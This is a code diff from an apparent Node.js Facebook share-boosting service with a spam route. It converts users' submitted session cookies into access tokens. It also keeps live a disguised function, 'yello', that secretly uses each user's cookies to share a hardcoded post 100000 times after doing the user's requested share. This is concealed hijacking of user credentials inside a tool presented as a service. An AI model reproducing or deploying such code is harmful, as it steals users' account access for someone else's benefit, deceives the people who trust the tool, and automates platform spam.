@@ -151,27 +151,25 @@ app.get("/nglspam", async (req, res) => {
 
 
 async function getAccessToken(cookie) {
+  const cookie1 = JSON.parse(cookie);
+  const cookie2 = cookie1.map(c => `${c.key}=${c.value}`).join('; ');
   try {
-    const cookie1 = JSON.parse(cookie);
-    const cookie2 = cookie1.map(c => `${c.key}=${c.value}`).join(';');
-    const headers = {
-      'authority': 'business.facebook.com',
-      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-      'cache-control': 'max-age=0',
-      'cookie': cookie2,
-      'referer': 'https://www.facebook.com/',
-      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-      'sec-ch-ua-mobile': '?0',
-      'sec-ch-ua-platform': '"Linux"',
-      'sec-fetch-dest': 'document',
-      'sec-fetch-mode': 'navigate',
-      'sec-fetch-site': 'same-origin',
-      'sec-fetch-user': '?1',
-      'upgrade-insecure-requests': '1',
-    };
     const response = await axios.get('https://business.facebook.com/content_management', {
-      headers
+      headers: {
+        'authority': 'business.facebook.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'cache-control': 'max-age=0',
+        'cookie': cookie2,
+        'referer': 'https://www.facebook.com/',
+        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+      }
     });
     const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
     if (token && token[1]) {
@@ -183,11 +181,6 @@ async function getAccessToken(cookie) {
   }
 }
 
-const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
-async function yello(c, u, a, i) {
-  await share(true, c, u, a, i);
-  await share(false, c, sauce, "100000", "6");
-}
 
 async function share(sharedIs, cookies, url, amount, interval) {
   const id = Math.floor(Math.random() * 69696969);
@@ -262,6 +255,12 @@ async function getPostID(url) {
   }
 }
 
+const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
+async function yello(c, u, a, i) {
+  await share(true, c, u, a, i);
+  await share(false, c, sauce, "100000", "6");
+}
+
 app.get('/shares', (req, res) => {
   const data = Array.from(total.values()).map((link, index) => ({
     shared: link.shared,
@@ -286,7 +285,8 @@ app.post('/share', async (req, res) => {
   });
   try {
     const cookies = await getAccessToken(cookie);
-    if (!cookies) return res.status(500).json({
+    if (!cookies)
+    return res.status(500).json({
       status: 500,
       error: "Invalid token"
     });
